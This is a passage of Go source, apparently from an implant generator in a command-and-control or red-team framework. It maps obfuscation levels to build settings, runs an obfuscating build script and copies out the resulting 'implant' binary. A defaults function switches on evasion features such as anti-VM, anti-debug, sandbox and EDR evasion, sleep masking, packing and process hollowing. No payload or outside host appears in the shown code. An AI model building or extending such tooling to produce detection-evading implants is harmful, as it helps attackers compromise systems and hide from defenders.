		} else if config.APIObfuscation || config.NetworkObfuscation || config.SandboxEvasion {
			obfLevel = 3 // Heavy
		} else if config.ControlFlowObfuscation || config.NameObfuscation {
			obfLevel = 2 // Medium
		} else {
			obfLevel = 1 // Light
		}
	}

	// Execute the enhanced build script
	buildCmd := exec.Command("./build_obfuscated.sh", fmt.Sprintf("%d", obfLevel))
	buildCmd.Dir = ig.outputDir
	buildCmd.Env = append(os.Environ(),
		fmt.Sprintf("GOOS=%s", config.OS),
		fmt.Sprintf("GOARCH=%s", config.Arch),
		"CGO_ENABLED=0", // Force static compilation for all platforms
	)

	output, err := buildCmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("enhanced obfuscation build failed: %v\nOutput: %s", err, string(output))
	}

	// Find the generated binary
	obfuscatedDir := filepath.Join(ig.outputDir, "obfuscated_builds")
	entries, err := os.ReadDir(obfuscatedDir)
	if err != nil {
		return "", fmt.Errorf("failed to read obfuscated builds directory: %v", err)
	}

	// Look for the appropriate binary for target platform
	var targetBinary string
	expectedPattern := fmt.Sprintf("implant_%s_%s", config.OS, config.Arch)
	if config.OS == "windows" {
		expectedPattern += ".exe"
	}

	for _, entry := range entries {
		if strings.Contains(entry.Name(), expectedPattern) {
			targetBinary = filepath.Join(obfuscatedDir, entry.Name())
			break
		}
	}

	if targetBinary == "" {
		return "", fmt.Errorf("could not find generated binary for %s/%s", config.OS, config.Arch)
	}

	// Generate output path using the baseFileName
	ext := ig.getExecutableExtension(config.OS)
	finalPath := filepath.Join(ig.outputDir, baseFileName+ext)

	// Copy the obfuscated binary to the final location
	data, err := os.ReadFile(targetBinary)
	if err != nil {
		return "", fmt.Errorf("failed to read obfuscated binary: %v", err)
	}

	if err := os.WriteFile(finalPath, data, 0755); err != nil {
		return "", fmt.Errorf("failed to write final binary: %v", err)
	}

	// Post-process binary based on format
	if config.Format != "exe" && config.Format != "" && config.Format != "binary" {
		return ig.postProcessBinary(finalPath, config)
	}

	return finalPath, nil
}

// setObfuscationDefaults sets default obfuscation options based on level
func (ig *ImplantGenerator) setObfuscationDefaults(config *ImplantConfig) {
	if config.ObfuscationLevel == 0 {
		return // No defaults for level 0
	}

	// Level 1 (Light) - Basic obfuscation
	if config.ObfuscationLevel >= 1 {
		config.StringObfuscation = true
		config.Obfuscate = true // Basic symbol stripping
	}

	// Level 2 (Medium) - Add name and control flow obfuscation
	if config.ObfuscationLevel >= 2 {
		config.NameObfuscation = true
		config.ControlFlowObfuscation = true
		config.AntiVM = true
		config.AntiDebug = true
	}

	// Level 3 (Heavy) - Add API and network obfuscation
	if config.ObfuscationLevel >= 3 {
		config.APIObfuscation = true
		config.NetworkObfuscation = true
		config.SandboxEvasion = true
		config.EDRDetection = true
		config.SleepMask = true
		config.UPXPacking = true
	}

	// Level 4 (Extreme) - Add runtime packing and advanced evasion
	if config.ObfuscationLevel >= 4 {
		config.RuntimePacking = true
		config.ProcessHollowing = true
		config.AntiEmulation = true
		config.NetworkFingerprinting = true
		config.FakeResources = true
	}
}
